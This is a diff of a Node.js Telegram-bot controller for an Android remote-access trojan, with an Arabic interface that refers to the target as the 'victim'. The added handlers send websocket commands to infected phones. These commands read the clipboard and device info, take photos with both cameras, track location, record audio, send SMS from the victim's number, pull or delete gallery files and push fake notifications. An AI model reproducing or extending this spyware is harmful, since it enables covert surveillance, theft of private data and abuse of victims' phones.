@@ -479,4 +479,242 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "ke
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'apps') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('apps');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Walid HM 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @WH_S8 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'device_info') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('device_info');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Walid HM 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @WH_S8 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'clipboard') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('clipboard');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Walid HM 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @WH_S8 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'camera_main') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('camera_main');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Walid HM 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @WH_S8 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'camera_selfie') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('camera_selfie');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Walid HM 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @WH_S8 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'location') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('location');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Walid HM 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @WH_S8 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'vibrate') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('vibrate');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Walid HM 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @walid_mp ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'stop_audio') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('stop_audio');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Walid HM 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @WH_S8 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'send_message') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id, '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية\n\n' +
+            '• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
+            {reply_markup: {force_reply: true}})
+        currentUuid = uuid
+    }
+    if (commend == 'send_message_to_all') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع\n\n' +
+            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
+            {reply_markup: {force_reply: true}}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'file') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية\n\n' +
+            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لتلقي ملفات المعرض.',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'delete_file') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل مسار الملف الذي تريد \n\n' +
+            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'microphone') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل مسار الملف الذي تريد \n\n' +
+            '• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ،',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'toast') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية\n\n' +
+            '• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ،',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'show_notification') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل الرسالة التي تريدها تظهر كما إشعار\n\n' +
+            '• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإخطار العادي ،',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'play_audio') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• °• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
+            '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب ، وإلا فلن يتم تشغيل الصوت ،',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+});
+setInterval(function () {
+    appSocket.clients.forEach(function each(ws) {
+        ws.send('ping')
+    });
+    try {
+        axios.get(address).then(r => "")
+    } catch (e) {
+    }
+}, 5000)
+appServer.listen(process.env.PORT || 8999);
